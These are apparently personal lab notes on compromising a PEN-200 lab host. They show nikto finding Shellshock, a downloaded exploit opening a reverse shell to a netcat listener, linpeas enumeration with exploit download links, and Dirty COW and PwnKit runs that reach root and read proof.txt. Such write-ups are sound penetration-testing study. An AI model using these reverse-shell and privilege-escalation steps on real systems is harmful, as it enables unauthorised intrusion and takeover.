

```c
#webfuzzing directory checking
- checked cache
- - checked core
- - - checked custom
- - - - checked phpmyadmin and found login page
```

![[1. cache.png]]

![[2. core.png]]

![[3. custom.png]]

![[4. phpmyadmin.png]]

```c
#mysql server
unsure where to go, using nikto to complete scans
```
![[5. mysqlserver.png]]

```shell
#nikto shows

+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' 
vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
```

```shell
#trying 1st shell shell, CVE-2014-6271

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.71]
└─# wget https://raw.githubusercontent.com/b4keSn4ke/CVE-2014-6271/main/shellshock.py
--2023-03-29 17:41:59--  https://raw.githubusercontent.com/b4keSn4ke/CVE-2014-6271/main/shellshock.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7382 (7.2K) [text/plain]
Saving to: ‘shellshock.py’

shellshock.py                                               100%[========================================================================================================================================>]   7.21K  --.-KB/s    in 0.002s  

2023-03-29 17:41:59 (2.90 MB/s) - ‘shellshock.py’ saved [7382/7382]
```

```shell
#throwing shellshock! always run nikto!

#CVE-2014-6271
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.71]
└─# python3 shellshock.py 192.168.119.157 4444 http://10.11.1.71/cgi-bin/admin.cgi

# setup listener and caught
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.119.157] from (UNKNOWN) [10.11.1.71] 54007
whoami
www-data
```

![[6. reverse shell.png]]

```shell
#upgraded into bash shell with python
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@alpha:/usr/lib/cgi-bin$ 
```

```shell
#beginning checks

#sudo -l
www-data@alpha:/usr/lib/cgi-bin$ sudo -l
sudo -l
[sudo] password for www-data: 



# cat /etc/crontab
www-data@alpha:/usr/lib/cgi-bin$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

#uname -a
www-data@alpha:/tmp$ uname -a
uname -a
Linux alpha 3.13.0-141-generic #190-Ubuntu SMP Fri Jan 19 12:52:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

# cat /roc/version
www-data@alpha:/tmp$ cat /proc/version
cat /proc/version
Linux version 3.13.0-141-generic (buildd@lgw01-amd64-018) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #190-Ubuntu SMP Fri Jan 19 12:52:38 UTC 2018
www-data@alpha:/tmp$ 

# potential local priv esc for kernel - going to upload linpeas first
https://www.exploit-db.com/exploits/37292
```

```shell
#successfully transferred linpeas

#linpeas pull analysis

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

# probable + ways forward

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: probable
   Tags: [ ubuntu=(12.04|14.04) ]{kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292


#Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 60 Oct  9  2014 /var/lib/phpmyadmin/blowfish_secret.inc.php
-rw-r----- 1 root www-data 0 Oct  9  2014 /var/lib/phpmyadmin/config.inc.php
-rw-r----- 1 root www-data 8 Oct  9  2014 /etc/phpmyadmin/htpasswd.setup
-rw-r----- 1 root www-data 549 Oct  9  2014 /etc/phpmyadmin/config-db.php

```

```shell
# trying dirty cow first
www-data@alpha:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt    
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory

# same error as previously, need to add cc1 to environmental variable
# cc1 exists just not in environmental variable
www-data@alpha:/tmp$ locate cc1
locate cc1
/etc/ssl/certs/6fcc125d.0
/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1
/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1plus
/usr/share/doc/libgcc1
/usr/share/lintian/overrides/libgcc1
/usr/share/terminfo/x/xterm+pcc1
/var/lib/dpkg/info/libgcc1:amd64.list
/var/lib/dpkg/info/libgcc1:amd64.md5sums
/var/lib/dpkg/info/libgcc1:amd64.postinst
/var/lib/dpkg/info/libgcc1:amd64.postrm
/var/lib/dpkg/info/libgcc1:amd64.shlibs
/var/lib/dpkg/info/libgcc1:amd64.symbols

# double checking gcc version
www-data@alpha:/tmp$ gcc -v
gcc -v
gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) 


# adding cc1 to environmental variable
www-data@alpha:/tmp$ export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1


#dirty was compiled
www-data@alpha:/tmp$ ls -la | grep dirty
ls -la | grep dirty
-rwxr-xr-x  1 www-data www-data   14302 Mar 29 18:10 dirty
-rw-r--r--  1 www-data www-data    4816 Mar 29 18:06 dirty.c
www-data@alpha:/tmp$ 

```

```shell
# ran dirty cow, and looks like it froze

www-data@alpha:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password

Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f221d70b000
whoami
whoami
ls
ls
```


```shell
#trying PwnKit
www-data@alpha:/tmp$ chmod +x PwnKit
chmod +x PwnKit
www-data@alpha:/tmp$ ./PwnKit
./PwnKit
root@alpha:/tmp# cd /root
cd /root
root@alpha:~# ls
ls
proof.txt
root@alpha:~# cat proof.txt
cat proof.txt
97f3446c2c2fc5079f22dc38f60c8a78
root@alpha:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:86:2d:6d brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.71/16 brd 10.11.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe86:2d6d/64 scope link 
       valid_lft forever preferred_lft forever
root@alpha:~# 

```

![[7. PwnKit & proof.txt.png]]